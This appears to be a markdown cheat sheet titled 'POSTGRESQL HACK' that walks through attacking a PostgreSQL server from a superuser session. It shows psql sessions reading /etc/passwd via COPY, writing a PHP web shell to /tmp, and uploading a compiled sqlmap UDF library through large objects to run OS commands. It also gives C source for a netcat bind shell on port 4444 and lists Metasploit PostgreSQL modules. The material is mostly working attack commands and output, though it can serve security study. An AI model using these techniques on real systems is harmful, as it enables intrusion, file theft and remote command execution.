**Authors**: < [nixawk](https://github.com/nixawk) >

----


#POSTGRESQL HACK#

----

##DATABASE CONNECTION##

Please connect to **postgresql** database,  

```
lab:~/ $ psql -h 127.0.0.1 -U postgres -W
```

----

##DATABASE COMMANDS##

```
postgres=# help
You are using psql, the command-line interface to PostgreSQL.
Type:  \copyright for distribution terms
       \h for help with SQL commands
       \? for help with psql commands
       \g or terminate with semicolon to execute query
       \q to quit
```

```
postgres=# \h
Available help:
  ABORT                            CREATE FOREIGN DATA WRAPPER      DROP SEQUENCE
  ALTER AGGREGATE                  CREATE FOREIGN TABLE             DROP SERVER
  ALTER COLLATION                  CREATE FUNCTION                  DROP TABLE
  ALTER CONVERSION                 CREATE GROUP                     DROP TABLESPACE
  ALTER DATABASE                   CREATE INDEX                     DROP TEXT SEARCH CONFIGURATION
  ALTER DEFAULT PRIVILEGES         CREATE LANGUAGE                  DROP TEXT SEARCH DICTIONARY
  ALTER DOMAIN                     CREATE MATERIALIZED VIEW         DROP TEXT SEARCH PARSER
  ALTER EVENT TRIGGER              CREATE OPERATOR                  DROP TEXT SEARCH TEMPLATE
  ALTER EXTENSION                  CREATE OPERATOR CLASS            DROP TRIGGER
  ALTER FOREIGN DATA WRAPPER       CREATE OPERATOR FAMILY           DROP TYPE
  ALTER FOREIGN TABLE              CREATE ROLE                      DROP USER
  ALTER FUNCTION                   CREATE RULE                      DROP USER MAPPING
  ALTER GROUP                      CREATE SCHEMA                    DROP VIEW
  ALTER INDEX                      CREATE SEQUENCE                  END
  ALTER LANGUAGE                   CREATE SERVER                    EXECUTE
  ALTER LARGE OBJECT               CREATE TABLE                     EXPLAIN
  ALTER MATERIALIZED VIEW          CREATE TABLE AS                  FETCH
  ALTER OPERATOR                   CREATE TABLESPACE                GRANT
  ALTER OPERATOR CLASS             CREATE TEXT SEARCH CONFIGURATION INSERT
  ALTER OPERATOR FAMILY            CREATE TEXT SEARCH DICTIONARY    LISTEN
  ALTER ROLE                       CREATE TEXT SEARCH PARSER        LOAD
  ALTER RULE                       CREATE TEXT SEARCH TEMPLATE      LOCK
  ALTER SCHEMA                     CREATE TRIGGER                   MOVE
  ALTER SEQUENCE                   CREATE TYPE                      NOTIFY
  ALTER SERVER                     CREATE USER                      PREPARE
  ALTER SYSTEM                     CREATE USER MAPPING              PREPARE TRANSACTION
  ALTER TABLE                      CREATE VIEW                      REASSIGN OWNED
  ALTER TABLESPACE                 DEALLOCATE                       REFRESH MATERIALIZED VIEW
  ALTER TEXT SEARCH CONFIGURATION  DECLARE                          REINDEX
  ALTER TEXT SEARCH DICTIONARY     DELETE                           RELEASE SAVEPOINT
  ALTER TEXT SEARCH PARSER         DISCARD                          RESET
  ALTER TEXT SEARCH TEMPLATE       DO                               REVOKE
  ALTER TRIGGER                    DROP AGGREGATE                   ROLLBACK
  ALTER TYPE                       DROP CAST                        ROLLBACK PREPARED
  ALTER USER                       DROP COLLATION                   ROLLBACK TO SAVEPOINT
  ALTER USER MAPPING               DROP CONVERSION                  SAVEPOINT
  ALTER VIEW                       DROP DATABASE                    SECURITY LABEL
  ANALYZE                          DROP DOMAIN                      SELECT
  BEGIN                            DROP EVENT TRIGGER               SELECT INTO
  CHECKPOINT                       DROP EXTENSION                   SET
  CLOSE                            DROP FOREIGN DATA WRAPPER        SET CONSTRAINTS
  CLUSTER                          DROP FOREIGN TABLE               SET ROLE
  COMMENT                          DROP FUNCTION                    SET SESSION AUTHORIZATION
  COMMIT                           DROP GROUP                       SET TRANSACTION
  COMMIT PREPARED                  DROP INDEX                       SHOW
  COPY                             DROP LANGUAGE                    START TRANSACTION
  CREATE AGGREGATE                 DROP MATERIALIZED VIEW           TABLE
  CREATE CAST                      DROP OPERATOR                    TRUNCATE
  CREATE COLLATION                 DROP OPERATOR CLASS              UNLISTEN
  CREATE CONVERSION                DROP OPERATOR FAMILY             UPDATE
  CREATE DATABASE                  DROP OWNED                       VACUUM
  CREATE DOMAIN                    DROP ROLE                        VALUES
  CREATE EVENT TRIGGER             DROP RULE                        WITH
  CREATE EXTENSION                 DROP SCHEMA                      

```

```
postgres=# \?
General
  \copyright             show PostgreSQL usage and distribution terms
  \g [FILE] or ;         execute query (and send results to file or |pipe)
  \gset [PREFIX]         execute query and store results in psql variables
  \h [NAME]              help on syntax of SQL commands, * for all commands
  \q                     quit psql
  \watch [SEC]           execute query every SEC seconds

Query Buffer
  \e [FILE] [LINE]       edit the query buffer (or file) with external editor
  \ef [FUNCNAME [LINE]]  edit function definition with external editor
  \p                     show the contents of the query buffer
  \r                     reset (clear) the query buffer
  \s [FILE]              display history or save it to file
  \w FILE                write query buffer to file

Input/Output
  \copy ...              perform SQL COPY with data stream to the client host
  \echo [STRING]         write string to standard output
  \i FILE                execute commands from file
  \ir FILE               as \i, but relative to location of current script
  \o [FILE]              send all query results to file or |pipe
  \qecho [STRING]        write string to query output stream (see \o)

Informational
  (options: S = show system objects, + = additional detail)
  \d[S+]                 list tables, views, and sequences
  \d[S+]  NAME           describe table, view, sequence, or index
  \da[S]  [PATTERN]      list aggregates
  \db[+]  [PATTERN]      list tablespaces
  \dc[S+] [PATTERN]      list conversions
  \dC[+]  [PATTERN]      list casts
  \dd[S]  [PATTERN]      show object descriptions not displayed elsewhere
  \ddp    [PATTERN]      list default privileges
  \dD[S+] [PATTERN]      list domains
  \det[+] [PATTERN]      list foreign tables
  \des[+] [PATTERN]      list foreign servers
  \deu[+] [PATTERN]      list user mappings
  \dew[+] [PATTERN]      list foreign-data wrappers
  \df[antw][S+] [PATRN]  list [only agg/normal/trigger/window] functions
  \dF[+]  [PATTERN]      list text search configurations
  \dFd[+] [PATTERN]      list text search dictionaries
  \dFp[+] [PATTERN]      list text search parsers
  \dFt[+] [PATTERN]      list text search templates
  \dg[+]  [PATTERN]      list roles
  \di[S+] [PATTERN]      list indexes
  \dl                    list large objects, same as \lo_list
  \dL[S+] [PATTERN]      list procedural languages
  \dm[S+] [PATTERN]      list materialized views
  \dn[S+] [PATTERN]      list schemas
  \do[S]  [PATTERN]      list operators
  \dO[S+] [PATTERN]      list collations
  \dp     [PATTERN]      list table, view, and sequence access privileges
  \drds [PATRN1 [PATRN2]] list per-database role settings
  \ds[S+] [PATTERN]      list sequences
  \dt[S+] [PATTERN]      list tables
  \dT[S+] [PATTERN]      list data types
  \du[+]  [PATTERN]      list roles
  \dv[S+] [PATTERN]      list views
  \dE[S+] [PATTERN]      list foreign tables
  \dx[+]  [PATTERN]      list extensions
  \dy     [PATTERN]      list event triggers
  \l[+]   [PATTERN]      list databases
  \sf[+] FUNCNAME        show a function's definition
  \z      [PATTERN]      same as \dp

Formatting
  \a                     toggle between unaligned and aligned output mode
  \C [STRING]            set table title, or unset if none
  \f [STRING]            show or set field separator for unaligned query output
  \H                     toggle HTML output mode (currently off)
  \pset [NAME [VALUE]]   set table output option
                         (NAME := {format|border|expanded|fieldsep|fieldsep_zero|footer|null|
                         numericlocale|recordsep|recordsep_zero|tuples_only|title|tableattr|pager})
  \t [on|off]            show only rows (currently off)
  \T [STRING]            set HTML <table> tag attributes, or unset if none
  \x [on|off|auto]       toggle expanded output (currently off)

Connection
  \c[onnect] {[DBNAME|- USER|- HOST|- PORT|-] | conninfo}
                         connect to new database (currently "postgres")
  \encoding [ENCODING]   show or set client encoding
  \password [USERNAME]   securely change the password for a user
  \conninfo              display information about current connection

Operating System
  \cd [DIR]              change the current working directory
  \setenv NAME [VALUE]   set or unset environment variable
  \timing [on|off]       toggle timing of commands (currently off)
  \! [COMMAND]           execute command in shell or start interactive shell

Variables
  \prompt [TEXT] NAME    prompt user to set internal variable
  \set [NAME [VALUE]]    set internal variable, or list all if no parameters
  \unset NAME            unset (delete) internal variable

Large Objects
  \lo_export LOBOID FILE
  \lo_import FILE [COMMENT]
  \lo_list
  \lo_unlink LOBOID      large object operations

```

----

###LIST DATABASES###

```
postgres=# \l
                                  List of databases
   Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
-----------+----------+----------+-------------+-------------+-----------------------
 msfdb     | msfuser  | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
 template1 | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
           |          |          |             |             | postgres=CTc/postgres
(4 rows)

```

----

###LIST DATABASE USERS###

```
postgres=# \du
                             List of roles
 Role name |                   Attributes                   | Member of
-----------+------------------------------------------------+-----------
 msfuser   |                                                | {}
 postgres  | Superuser, Create role, Create DB, Replication | {}

```

Please try more details about postgresql database.


----

##LIST DIRECTORY##

```
postgres=# select pg_ls_dir('/etc');
ERROR:  absolute path not allowed
postgres=# select pg_ls_dir('./');
      pg_ls_dir       
----------------------
 postmaster.opts
 postmaster.pid
 pg_logical
 pg_clog
 postgresql.auto.conf
 pg_hba.conf
 cmd.so
 pg_multixact
 postgresql.conf
 pg_ident.conf
 global
 pg_stat_tmp
 PG_VERSION
 pg_dynshmem
 pg_twophase
 pg_xlog
 pg_notify
 pg_snapshots
 pg_tblspc
 pg_serial
 pg_stat
 base
 pg_subtrans
 pg_replslot
(24 rows)

```

----

##READ FILE##

**method1**

```
postgres=# select pg_read_file('postgresql.conf', 0, 200);
                pg_read_file                
--------------------------------------------
 # -----------------------------           +
 # PostgreSQL configuration file           +
 # -----------------------------           +
 #                                         +
 # This file consists of lines of the form:+
 #                                         +
 #   name = value                          +
 #                                         +
 # (The "=" is optional.)  Whitespace m
(1 row)

```

**method2**

```
postgres=# drop table pwn;
ERROR:  table "pwn" does not exist
postgres=# CREATE TABLE pwn(t TEXT);
CREATE TABLE
postgres=# COPY pwn FROM '/etc/passwd';
COPY 27
postgres=# SELECT * FROM pwn limit 1 offset 0;
                t                
---------------------------------
 root:x:0:0:root:/root:/bin/bash
(1 row)

postgres=# SELECT * FROM pwn;
                                      t                                       
------------------------------------------------------------------------------
 root:x:0:0:root:/root:/bin/bash
 bin:x:1:1:bin:/bin:/usr/bin/nologin
 daemon:x:2:2:daemon:/:/usr/bin/nologin
 mail:x:8:12:mail:/var/spool/mail:/usr/bin/nologin
 ftp:x:14:11:ftp:/srv/ftp:/usr/bin/nologin
 http:x:33:33:http:/srv/http:/usr/bin/nologin
 uuidd:x:68:68:uuidd:/:/usr/bin/nologin
 dbus:x:81:81:dbus:/:/usr/bin/nologin
 nobody:x:99:99:nobody:/:/usr/bin/nologin
 systemd-journal-gateway:x:191:191:systemd-journal-gateway:/:/usr/bin/nologin
 systemd-timesync:x:192:192:systemd-timesync:/:/usr/bin/nologin
 systemd-network:x:193:193:systemd-network:/:/usr/bin/nologin
 systemd-bus-proxy:x:194:194:systemd-bus-proxy:/:/usr/bin/nologin
 systemd-resolve:x:195:195:systemd-resolve:/:/usr/bin/nologin
 systemd-journal-remote:x:999:999:systemd Journal Remote:/:/sbin/nologin
 systemd-journal-upload:x:998:998:systemd Journal Upload:/:/sbin/nologin
 avahi:x:84:84:avahi:/:/bin/false
 polkitd:x:102:102:Policy Kit Daemon:/:/bin/false
 git:x:997:997:git daemon user:/:/bin/bash
 colord:x:124:124::/var/lib/colord:/bin/false
 postgres:x:88:88:PostgreSQL user:/var/lib/postgres:/bin/bash
 lab:x:1000:1000::/home/notfound:/bin/bash
 stunnel:x:16:16::/var/run/stunnel:/bin/false
 dnsmasq:x:996:996:dnsmasq daemon:/:/usr/bin/nologin
 mongodb:x:995:2::/var/lib/mongodb:/bin/bash
 mysql:x:89:89::/var/lib/mysql:/bin/false
 sslh:x:994:994::/:/sbin/nologin
(27 rows)

postgres=# DROP table pwn;

```
----

##WRITE FILE##

```
postgres=# DROP TABLE pwn;
DROP TABLE
postgres=# CREATE TABLE pwn (t TEXT);
CREATE TABLE
postgres=# INSERT INTO pwn(t) VALUES ('<?php @system("$_GET[cmd]");?>');
INSERT 0 1
postgres=# SELECT * FROM pwn;
               t                
--------------------------------
 <?php @system("$_GET[cmd]");?>
(1 row)

postgres=# COPY pwn(t) TO '/tmp/cmd.php';
COPY 1
postgres=# DROP TABLE pwn;
DROP TABLE
```


----

##UDF HACK##


###COMPILE SOURCE###

```
lab: / $ git clone https://github.com/sqlmapproject/udfhack/
```

```
lab: / $ gcc lib_postgresqludf_sys.c -I`pg_config --includedir-server` -fPIC -shared -o udf64.so
lab: / $ gcc -Wall -I/usr/include/postgresql/server -Os -shared lib_postgresqludf_sys.c -fPIC -o lib_postgresqludf_sys.so
lab: / $ strip -sx lib_postgresqludf_sys.so
```

###COMMAND EXECUTION###

transfrom udf.so to hex strings.

```
lab:~/ $ cat udf.so | hex
```

upload udf.so with databse features.

```
postgres=# INSERT INTO pg_largeobject (loid, pageno, data) VALUES (19074, 0, decode('079c...', 'hex'));
INSERT 0 1


postgres=# SELECT lo_export(19074, 'cmd.so');
ERROR:  pg_largeobject entry for OID 19074, page 0 has invalid data field size 3213
postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';
        setting         
------------------------
 /var/lib/postgres/data
(1 row)
```

Library is too large, and we need to split it to some pieces.  Please read https://github.com/sqlmapproject/sqlmap/issues/1170.

```
postgres=# select * from pg_largeobject;
 loid | pageno | data
------+--------+------
(0 rows)

postgres=# SELECT setting FROM pg_settings WHERE name='data_directory';
        setting         
------------------------
 /var/lib/postgres/data
(1 row)

postgres=# SELECT lo_creat(-1);
 lo_creat
----------
    19075
(1 row)

postgres=# SELECT lo_create(11122);
 lo_create
-----------
     11122
(1 row)

postgres=# select * from pg_largeobject;
 loid | pageno | data
------+--------+------
(0 rows)

postgres=# INSERT INTO pg_largeobject VALUES (11122, 0, decode('079c...', 'hex'));
INSERT 0 1
postgres=# INSERT INTO pg_largeobject VALUES (11122, 1, decode('a28e...', 'hex'));
INSERT 0 1
postgres=# INSERT INTO pg_largeobject VALUES (11122, 2, decode('1265...', 'hex'));
INSERT 0 1
postgres=# INSERT INTO pg_largeobject VALUES (11122, 3, decode('c62e...', 'hex'));
INSERT 0 1
postgres=# SELECT lo_export(11122, '/tmp/cmd.so');
 lo_export
-----------
         1
(1 row)

postgres=# SELECT lo_unlink(11122);
 lo_unlink
-----------
         1
(1 row)

```
upload library successfully, and then create Postgresql FUNCTION.

```
postgres=# CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS int4 AS '/tmp/udf64.so', 'sys_exec' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE FUNCTION
postgres=# CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/tmp/udf64.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;
CREATE FUNCTION
```

Execute commands with **sys\_exec**, and nothing returns.

```
postgres=# SELECT sys_exec('id');
 sys_exec
----------
        0
(1 row)
```

Please clear functions after commands execution.

```
postgres=# DROP FUNCTION sys_exec(text);
DROP FUNCTION
postgres=# DROP FUNCTION sys_eval(text);
DROP FUNCTION

```

###BIND SHELL###

```
// bind shell on port 4444
#include "postgres.h"
#include "fmgr.h"
#include <stdlib.h>

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

text *exec()
{
    system("ncat -e /bin/bash -l -p 4444");
}

```
compile source code,

```
lab:postgres_cmd/ $  vim nc.c
lab:postgres_cmd/ $  gcc nc.c -I`pg_config --includedir-server` -fPIC -shared -o nc.so
lab:postgres_cmd/ $  strip -sx nc.so
```

copy nc.so to postgresql tmp path, or you can upload so file with database features.

```
lab:postgres_cmd/ $  sudo cp nc.so /tmp/systemd-private-374c1bd49d5f425ca21cca8cc6d89de7-postgresql.service-SKrVjI/tmp/nc.so
```

create FUNCTION exec for bind shell. And client connects to target.

```
postgres=# CREATE OR REPLACE FUNCTION exec() RETURNS text AS  '/tmp/nc.so', 'exec' LANGUAGE C STRICT;
CREATE FUNCTION
postgres=# SELECT exec();
server closed the connection unexpectedly
    This probably means the server terminated abnormally
    before or while processing the request.
The connection to the server was lost. Attempting reset: Failed.

```

----


##METASPLOIT POSTGRESQL MODULES##

```
use auxiliary/admin/postgres/postgres_readfile
use auxiliary/admin/postgres/postgres_sql
use auxiliary/scanner/postgres/postgres_dbname_flag_injection
use auxiliary/scanner/postgres/postgres_login
use auxiliary/scanner/postgres/postgres_version
use auxiliary/server/capture/postgresql
use exploit/linux/postgres/postgres_payload
use exploit/windows/postgres/postgres_payload
```



#REFERENCES#

https://github.com/sqlmapproject/udfhack/  
https://github.com/sqlmapproject/sqlmap/issues/1170   
http://zone.wooyun.org/content/4971  
http://drops.wooyun.org/tips/6449  
http://bernardodamele.blogspot.com/2009/01/command-execution-with-postgresql-udf.html  
